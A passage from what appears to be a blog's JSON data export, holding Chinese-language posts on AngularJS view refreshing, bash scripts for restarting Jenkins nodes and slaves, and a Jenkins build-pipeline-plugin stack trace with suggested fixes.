//$location.path(url).replace();\n\n    //this this if you want to change the URL and add it to the history stack\n    $location.path(url);\n    $scope.$apply();\n  }\n};\n```\n\n### 2. 方法二\n通过自带的参数reload，要求视图跳转时强制刷新视图内容。\n``` javascript\n$state.go(\"stage2\", {}, {\"reload\": true});\n```\n\n或者视图跳转完后，通过reloa()方法刷新视图。\n``` javascript\n$state.go(\"stage2\");\n$state.reload(\"stage2\");\n```\n\n\n## 二、参考文档\n- [In Angular, how to redirect with $location.path as $http.post success callback](http://stackoverflow.com/a/14387747)\n- [$state](http://angular-ui.github.io/ui-router/site/#/api/ui.router.state.$state)","slug":"article/js/angularjs视图跳转不刷新问题","published":1,"updated":"2016-03-31T15:08:41.000Z","_id":"cilpxkgaw0037avbtrld2mjoh","comments":1,"layout":"post","photos":[],"link":""},{"title":"jenkins节点重启脚本","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" />\n\n\n## 远程重启jenkins节点脚本\n``` bash\nNODE_CONFIG=nodes.ini\nJENKINS_CLIENT_COMMAND=/opt/work/local/jenkins/jenkins-client/bin/client.sh\n\n\nstart_nodes() {\n        while read node\n        do\n                if [ -z \"$node\" ]; then\n                        continue;\n                fi\n\n                echo \"current node: $node\";\n                start_remote_jenkins $node;\n        done < $NODE_CONFIG\n}\n\nstart_remote_jenkins() {\n        remote_ip=$1\n        ssh $remote_ip 2>&1 << remote_command\n        sh $JENKINS_CLIENT_COMMAND;\n        exit;\nremote_command\n}\n\n\nstart_nodes\n```\n\n<!-- more -->\n\n## jenkins slave脚本\njenkins slave重启脚本\n\n``` bash\n\n\nfunction file_source() {\n  if [ -f $1 ]; then\n    source $1;\n  fi\n}\n\n\nfile_source /etc/profile\nfile_source ~/.profile\nfile_source ~/bash_profile\n\n\nif test -z \"${JAVA_HOME}\"; then\n  echo \"please config JAVA_HOME~\"\n  exit 1;\nfi\n\n\nBIN_PARAM='start'\nif [ $# -ge 1 ]; then\n  BIN_PARAM=$1\nfi\n\n\nJAVA_EXE=$JAVA_HOME/bin/java\n\nBIN_PATH=$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )\nSLAVE_CONFIG=$BIN_PATH/slave.conf\nsource $SLAVE_CONFIG \n\nSLAVE_HOME=$(dirname $BIN_PATH)\nLOG_FILE=$SLAVE_HOME/logs/jenkins_slave.log\n\nSLAVE_PID_COMMAND=\"ps -ef | grep $SECRET_ID | grep -v grep | awk '{print \\$2}'\"\nSLAVE_PID=$(eval $SLAVE_PID_COMMAND)\n\nSTART_COMMAND=\"nohup $JAVA_EXE -jar ${BIN_PATH}/slave.jar -jnlpUrl http://${SERVER_HOST}:${SERVER_PORT}/computer/${SLAVE_NAME}/slave-agent.jnlp -secret $SECRET_ID 1>>$LOG_FILE 2>&1 &\"\n\n\necho \"========================================\"\necho \"java bin path: $JAVA_EXE\"\necho \"slave client home path: $SLAVE_HOME\"\necho \"slave client bin path: $BIN_PATH\"\necho \"load slave client conf: $SLAVE_CONFIG\"\necho \"========================================\"\necho \"jenkins connection params:\"\necho \"  - server host: $SERVER_HOST\"\necho \"  - server port: $SERVER_PORT\"\necho \"  - slave name: $SLAVE_NAME\"\necho \"  - secret id: $SECRET_ID\"\necho \"========================================\"\n\n\n\nfunction startup() {\n  echo \"execute get process command: $SLAVE_PID_COMMAND\"\n  if [ -n \"$SLAVE_PID\" ]; then\n    echo \"process with $SECRET_ID has existed.\"\n    echo \"jenkins slave client pid: $SLAVE_PID\"\n    exit 0;\n  fi\n\n  echo \"execute script shell: $START_COMMAND\"\n  eval $START_COMMAND\n  \n  if [ $? -ne 0 ]; then\n    echo \"fail to startup the jenkins slave client.\"\n    exit 1;\n  fi\n\n  SLAVE_PID=$(eval $SLAVE_PID_COMMAND)\n  echo \"the jenkins slave client process id: $SLAVE_PID\"\n  return;\n}\n\n\nfunction shutdown() {\n  echo \"execute get process command: $SLAVE_PID_COMMAND\"\n  if [ -z \"$SLAVE_PID\" ]; then\n    echo \"no process with $SECRET_ID\"\n    exit 0;\n  fi\n  \n  echo \"killing process with pid: $SLAVE_PID\"\n  kill -9 $SLAVE_PID\n\n  if [ $? -ne 0 ]; then\n    echo \"fail to shutdown the jenkins slave client with pid: $SLAVE_PID\"\n    exit 1;\n  fi\n\n  echo \"the jenkins slave client has stoped.\"\n  return;\n}\n\n\nfunction bootstrap() {\n  if [ $BIN_PARAM == \"start\" ] || [ $BIN_PARAM == \"startup\" ]; then\n    echo \"startup jenkins slave client...\"\n    startup\n    exit 0;\n  elif [ $BIN_PARAM == \"stop\" ] || [ $BIN_PARAM == \"shutdown\" ]; then\n    echo \"shutdown jenkins slave client...\"\n    shutdown\n    exit 0;\n  else\n    echo \"not support param: $1\"\n    exit 1;\n  fi\n}\n\n\nbootstrap\n\n```\n\n\n## node节点\n``` javascript\nvar links = document.getElementsByClassName(\"model-link\");\nfor (var i=0;i<links.length;i++)\n{\n\tconsole.log(links[i].innerText);\n}\n```\n\n``` ini\n10.10.1.11\n10.10.1.12\n10.10.1.13\n10.13.2.14\n10.13.2.15\n10.13.2.16\n```","source":"_posts/article/jenkins/jenkins节点重启脚本.md","raw":"categories:\n  - 持续集成\ntags:\n  - jenkins\ntitle: jenkins节点重启脚本\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" />\n\n\n## 远程重启jenkins节点脚本\n``` bash\nNODE_CONFIG=nodes.ini\nJENKINS_CLIENT_COMMAND=/opt/work/local/jenkins/jenkins-client/bin/client.sh\n\n\nstart_nodes() {\n        while read node\n        do\n                if [ -z \"$node\" ]; then\n                        continue;\n                fi\n\n                echo \"current node: $node\";\n                start_remote_jenkins $node;\n        done < $NODE_CONFIG\n}\n\nstart_remote_jenkins() {\n        remote_ip=$1\n        ssh $remote_ip 2>&1 << remote_command\n        sh $JENKINS_CLIENT_COMMAND;\n        exit;\nremote_command\n}\n\n\nstart_nodes\n```\n\n<!-- more -->\n\n## jenkins slave脚本\njenkins slave重启脚本\n\n``` bash\n\n\nfunction file_source() {\n  if [ -f $1 ]; then\n    source $1;\n  fi\n}\n\n\nfile_source /etc/profile\nfile_source ~/.profile\nfile_source ~/bash_profile\n\n\nif test -z \"${JAVA_HOME}\"; then\n  echo \"please config JAVA_HOME~\"\n  exit 1;\nfi\n\n\nBIN_PARAM='start'\nif [ $# -ge 1 ]; then\n  BIN_PARAM=$1\nfi\n\n\nJAVA_EXE=$JAVA_HOME/bin/java\n\nBIN_PATH=$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )\nSLAVE_CONFIG=$BIN_PATH/slave.conf\nsource $SLAVE_CONFIG \n\nSLAVE_HOME=$(dirname $BIN_PATH)\nLOG_FILE=$SLAVE_HOME/logs/jenkins_slave.log\n\nSLAVE_PID_COMMAND=\"ps -ef | grep $SECRET_ID | grep -v grep | awk '{print \\$2}'\"\nSLAVE_PID=$(eval $SLAVE_PID_COMMAND)\n\nSTART_COMMAND=\"nohup $JAVA_EXE -jar ${BIN_PATH}/slave.jar -jnlpUrl http://${SERVER_HOST}:${SERVER_PORT}/computer/${SLAVE_NAME}/slave-agent.jnlp -secret $SECRET_ID 1>>$LOG_FILE 2>&1 &\"\n\n\necho \"========================================\"\necho \"java bin path: $JAVA_EXE\"\necho \"slave client home path: $SLAVE_HOME\"\necho \"slave client bin path: $BIN_PATH\"\necho \"load slave client conf: $SLAVE_CONFIG\"\necho \"========================================\"\necho \"jenkins connection params:\"\necho \"  - server host: $SERVER_HOST\"\necho \"  - server port: $SERVER_PORT\"\necho \"  - slave name: $SLAVE_NAME\"\necho \"  - secret id: $SECRET_ID\"\necho \"========================================\"\n\n\n\nfunction startup() {\n  echo \"execute get process command: $SLAVE_PID_COMMAND\"\n  if [ -n \"$SLAVE_PID\" ]; then\n    echo \"process with $SECRET_ID has existed.\"\n    echo \"jenkins slave client pid: $SLAVE_PID\"\n    exit 0;\n  fi\n\n  echo \"execute script shell: $START_COMMAND\"\n  eval $START_COMMAND\n  \n  if [ $? -ne 0 ]; then\n    echo \"fail to startup the jenkins slave client.\"\n    exit 1;\n  fi\n\n  SLAVE_PID=$(eval $SLAVE_PID_COMMAND)\n  echo \"the jenkins slave client process id: $SLAVE_PID\"\n  return;\n}\n\n\nfunction shutdown() {\n  echo \"execute get process command: $SLAVE_PID_COMMAND\"\n  if [ -z \"$SLAVE_PID\" ]; then\n    echo \"no process with $SECRET_ID\"\n    exit 0;\n  fi\n  \n  echo \"killing process with pid: $SLAVE_PID\"\n  kill -9 $SLAVE_PID\n\n  if [ $? -ne 0 ]; then\n    echo \"fail to shutdown the jenkins slave client with pid: $SLAVE_PID\"\n    exit 1;\n  fi\n\n  echo \"the jenkins slave client has stoped.\"\n  return;\n}\n\n\nfunction bootstrap() {\n  if [ $BIN_PARAM == \"start\" ] || [ $BIN_PARAM == \"startup\" ]; then\n    echo \"startup jenkins slave client...\"\n    startup\n    exit 0;\n  elif [ $BIN_PARAM == \"stop\" ] || [ $BIN_PARAM == \"shutdown\" ]; then\n    echo \"shutdown jenkins slave client...\"\n    shutdown\n    exit 0;\n  else\n    echo \"not support param: $1\"\n    exit 1;\n  fi\n}\n\n\nbootstrap\n\n```\n\n\n## node节点\n``` javascript\nvar links = document.getElementsByClassName(\"model-link\");\nfor (var i=0;i<links.length;i++)\n{\n\tconsole.log(links[i].innerText);\n}\n```\n\n``` ini\n10.10.1.11\n10.10.1.12\n10.10.1.13\n10.13.2.14\n10.13.2.15\n10.13.2.16\n```","slug":"article/jenkins/jenkins节点重启脚本","published":1,"updated":"2016-03-31T15:44:26.000Z","_id":"cilpxkgay003cavbtqjiu2s8r","comments":1,"layout":"post","photos":[],"link":""},{"title":"jenkins build-pipeline-plugin 数值解析异常","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" />\n\n\njenkins version: 1.574\n\n## 问题分析\n这是jenkins 里使用了 build-pipeline-plugin，这个插件解析有问题。\n目前，这个bug已经有人修复，处于resolved状态，等待异常报告者验收，修改代码目前是应该处于未发布状态。\n\n**参考**：[Jenkins gives strack trace on main page](https://issues.jenkins-ci.org/browse/JENKINS-24102)\n\n<!-- more -->\n\n## 异常堆栈\n遇到的异常堆栈内容如下：\n``` java\nA problem occurred while processing the request. Please check our bug tracker to see if a similar problem has already been reported. If it is already reported, please vote and put a comment on it to let us gauge the impact of the problem. If you think this is a new issue, please file a new issue. When you file an issue, make sure to add the entire stack trace, along with the version of Jenkins and relevant plugins. The users list might be also useful in understanding what has happened.\n\nStack trace\n\njavax.servlet.ServletException: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/hudson/model/View/index.jelly:42:43: <st:include> org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/lib/hudson/projectView.jelly:66:22: <d:invokeBody> null\n\tat org.kohsuke.stapler.jelly.JellyClassTearOff.serveIndexJelly(JellyClassTearOff.java:117)\n\tat org.kohsuke.stapler.jelly.JellyFacet.handleIndexRequest(JellyFacet.java:127)\n\tat org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:717)\n\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:858)\n\tat org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:795)\n\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:858)\n\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:631)\n\tat org.kohsuke.stapler.Stapler.service(Stapler.java:225)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:848)\n\tat org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:686)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1494)\n\tat hudson.util.PluginServletFilter$1.doFilter(PluginServletFilter.java:96)\n\tat hudson.util.PluginServletFilter.doFilter(PluginServletFilter.java:88)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1482)\n\tat hudson.security.csrf.CrumbFilter.doFilter(CrumbFilter.java:48)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1482)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:84)\n\tat hudson.security.UnwrapSecurityExceptionFilter.doFilter(UnwrapSecurityExceptionFilter.java:51)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat jenkins.security.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:117)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.providers.anonymous.AnonymousProcessingFilter.doFilter(AnonymousProcessingFilter.java:125)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.ui.rememberme.RememberMeProcessingFilter.doFilter(RememberMeProcessingFilter.java:142)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.ui.AbstractProcessingFilter.doFilter(AbstractProcessingFilter.java:271)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.ui.basicauth.BasicProcessingFilter.doFilter(BasicProcessingFilter.java:174)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat jenkins.security.ApiTokenFilter.doFilter(ApiTokenFilter.java:79)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.context.HttpSessionContextIntegrationFilter.doFilter(HttpSessionContextIntegrationFilter.java:249)\n\tat hudson.security.HttpSessionContextIntegrationFilter2.doFilter(HttpSessionContextIntegrationFilter2.java:67)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat hudson.security.ChainedServletFilter.doFilter(ChainedServletFilter.java:76)\n\tat hudson.security.HudsonFilter.doFilter(HudsonFilter.java:164)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1482)\n\tat org.kohsuke.stapler.compression.CompressionFilter.doFilter(CompressionFilter.java:46)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1482)\n\tat hudson.util.CharacterEncodingFilter.doFilter(CharacterEncodingFilter.java:81)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1474)\n\tat org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:499)\n\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:137)\n\tat org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:533)\n\tat org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:231)\n\tat org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1086)\n\tat org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:428)\n\tat org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:193)\n\tat org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1020)\n\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:135)\n\tat org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:116)\n\tat org.eclipse.jetty.server.Server.handle(Server.java:370)\n\tat org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:489)\n\tat org.eclipse.jetty.server.AbstractHttpConnection.headerComplete(AbstractHttpConnection.java:949)\n\tat org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.headerComplete(AbstractHttpConnection.java:1011)\n\tat org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:644)\n\tat org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:235)\n\tat org.eclipse.jetty.server.AsyncHttpConnection.handle(AsyncHttpConnection.java:82)\n\tat org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:668)\n\tat org.eclipse.jetty.io.nio.SelectChannelEndPoint$1.run(SelectChannelEndPoint.java:52)\n\tat winstone.BoundedExecutorService$1.run(BoundedExecutorService.java:77)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:626)\n\tat java.lang.Thread.run(Thread.java:804)\nCaused by: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/hudson/model/View/index.jelly:42:43: <st:include> org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/lib/hudson/projectView.jelly:66:22: <d:invokeBody> null\n\tat org.apache.commons.jelly.impl.TagScript.handleException(TagScript.java:726)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:281)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript$1.run(CallTagLibScript.java:99)\n\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:91)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$1.run(CoreTagLibrary.java:98)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$2.run(CoreTagLibrary.java:105)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:120)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript$1.run(CallTagLibScript.java:99)\n\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:91)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$2.run(CoreTagLibrary.java:105)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:120)\n\tat org.kohsuke.stapler.jelly.CompressTag.doTag(CompressTag.java:44)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\tat org.kohsuke.stapler.jelly.JellyViewScript.run(JellyViewScript.java:81)\n\tat org.kohsuke.stapler.jelly.DefaultScriptInvoker.invokeScript(DefaultScriptInvoker.java:63)\n\tat org.kohsuke.stapler.jelly.DefaultScriptInvoker.invokeScript(DefaultScriptInvoker.java:53)\n\tat org.kohsuke.stapler.jelly.JellyClassTearOff.serveIndexJelly(JellyClassTearOff.java:112)\n\t... 63 more\nCaused by: java.lang.RuntimeException: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/lib/hudson/projectView.jelly:66:22: <d:invokeBody> null\n\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder.doInvokeMethod(JellyBuilder.java:280)\n\tat org.kohsuke.stapler.jelly.groovy.Namespace$ProxyImpl.invoke(Namespace.java:92)\n\tat com.sun.proxy.$Proxy56.projectView(Unknown Source)\n\tat lib.JenkinsTagLib$projectView.call(Unknown Source)\n\tat hudson.model.View.main.run(main.groovy:14)\n\tat org.kohsuke.stapler.jelly.groovy.GroovierJellyScript.run(GroovierJellyScript.java:74)\n\tat org.kohsuke.stapler.jelly.groovy.GroovierJellyScript.run(GroovierJellyScript.java:62)\n\tat org.kohsuke.stapler.jelly.IncludeTag.doTag(IncludeTag.java:147)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\t... 95 more\nCaused by: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/lib/hudson/projectView.jelly:66:22: <d:invokeBody> null\n\tat org.apache.commons.jelly.impl.TagScript.handleException(TagScript.java:726)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:281)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$1.run(CoreTagLibrary.java:98)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$2.run(CoreTagLibrary.java:105)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:120)\n\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder.doInvokeMethod(JellyBuilder.java:276)\n\t... 103 more\nCaused by: java.lang.NumberFormatException: null\n\tat java.lang.Integer.parseInt(Integer.java:465)\n\tat java.lang.Integer.valueOf(Integer.java:593)\n\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.getBuildPipelineForm(BuildPipelineView.java:400)\n\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.getItems(BuildPipelineView.java:866)\n\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.hasPermission(BuildPipelineView.java:932)\n\tat hudson.model.ViewGroupMixIn.getViews(ViewGroupMixIn.java:115)\n\tat jenkins.model.Jenkins.getViews(Jenkins.java:1444)\n\tat sun.reflect.GeneratedMethodAccessor255.invoke(Unknown Source)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:55)\n\tat java.lang.reflect.Method.invoke(Method.java:618)\n\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)\n\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)\n\tat groovy.lang.MetaClassImpl$GetBeanMethodMetaProperty.getProperty(MetaClassImpl.java:3500)\n\tat org.codehaus.groovy.runtime.callsite.GetEffectivePojoPropertySite.getProperty(GetEffectivePojoPropertySite.java:61)\n\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.callGetProperty(AbstractCallSite.java:227)\n\tat hudson.model.View.main$_run_closure1.doCall(main.groovy:15)\n\tat sun.reflect.GeneratedMethodAccessor382.invoke(Unknown Source)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:55)\n\tat java.lang.reflect.Method.invoke(Method.java:618)\n\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)\n\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)\n\tat org.codehaus.groovy.runtime.metaclass.ClosureMetaClass.invokeMethod(ClosureMetaClass.java:272)\n\tat groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:903)\n\tat org.codehaus.groovy.runtime.callsite.PogoMetaClassSite.callCurrent(PogoMetaClassSite.java:66)\n\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:141)\n\tat hudson.model.View.main$_run_closure1.doCall(main.groovy)\n\tat sun.reflect.GeneratedMethodAccessor381.invoke(Unknown Source)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:55)\n\tat java.lang.reflect.Method.invoke(Method.java:618)\n\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)\n\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)\n\tat org.codehaus.groovy.runtime.metaclass.ClosureMetaClass.invokeMethod(ClosureMetaClass.java:272)\n\tat groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:903)\n\tat groovy.lang.Closure.call(Closure.java:415)\n\tat groovy.lang.Closure.call(Closure.java:409)\n\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder$1.run(JellyBuilder.java:264)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript$1.run(CallTagLibScript.java:99)\n\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:91)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\t... 111 more\n```\n\n\n## 解决方案\n1. 重启jenkins服务(自己发现的)\n服务出异常后，发现只要jenkins页面刷新后，jenkins cpu使用率会达到200％+，物理内存占用1.1g，虚拟内存占用2.7g。不知道跟这个异常有没关系。\n\n2. 尝试升级build-pipeline-plugin。\n\n3. 尝试升级jenkins版本。","source":"_posts/article/jenkins/jenkins插件buildpipeline数值解析异常.md","raw":"categories:\n  - 持续集成\ntags:\n  - issue\n  - jenkins\ntitle: jenkins build-pipeline-plugin 数值解析异常\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" />\n\n\njenkins version: 1.574\n\n## 问题分析\n这是jenkins 里使用了 build-pipeline-plugin，这个插件解析有问题。\n目前，这个bug已经有人修复，处于resolved状态，等待异常报告者验收，修改代码目前是应该处于未发布状态。\n\n**参考**：[Jenkins gives strack trace on main page](https://issues.jenkins-ci.org/browse/JENKINS-24102)\n\n<!-- more -->\n\n## 异常堆栈\n遇到的异常堆栈内容如下：\n``` java\nA problem occurred while processing the request. Please check our bug tracker to see if a similar problem has already been reported. If it is already reported, please vote and put a comment on it to let us gauge the impact of the problem. If you think this is a new issue, please file a new issue. When you file an issue, make sure to add the entire stack trace, along with the version of Jenkins and relevant plugins. The users list might be also useful in understanding what has happened.\n\nStack trace\n\njavax.servlet.ServletException: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/hudson/model/View/index.jelly:42:43: <st:include> org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/lib/hudson/projectView.jelly:66:22: <d:invokeBody> null\n\tat org.kohsuke.stapler.jelly.JellyClassTearOff.serveIndexJelly(JellyClassTearOff.java:117)\n\tat org.kohsuke.stapler.jelly.JellyFacet.handleIndexRequest(JellyFacet.java:127)\n\tat org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:717)\n\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:858)\n\tat org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:795)\n\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:858)\n\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:631)\n\tat org.kohsuke.stapler.Stapler.service(Stapler.java:225)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:848)\n\tat org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:686)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1494)\n\tat hudson.util.PluginServletFilter$1.doFilter(PluginServletFilter.java:96)\n\tat hudson.util.PluginServletFilter.doFilter(PluginServletFilter.java:88)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1482)\n\tat hudson.security.csrf.CrumbFilter.doFilter(CrumbFilter.java:48)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1482)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:84)\n\tat hudson.security.UnwrapSecurityExceptionFilter.doFilter(UnwrapSecurityExceptionFilter.java:51)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat jenkins.security.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:117)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.providers.anonymous.AnonymousProcessingFilter.doFilter(AnonymousProcessingFilter.java:125)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.ui.rememberme.RememberMeProcessingFilter.doFilter(RememberMeProcessingFilter.java:142)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.ui.AbstractProcessingFilter.doFilter(AbstractProcessingFilter.java:271)\n\tat 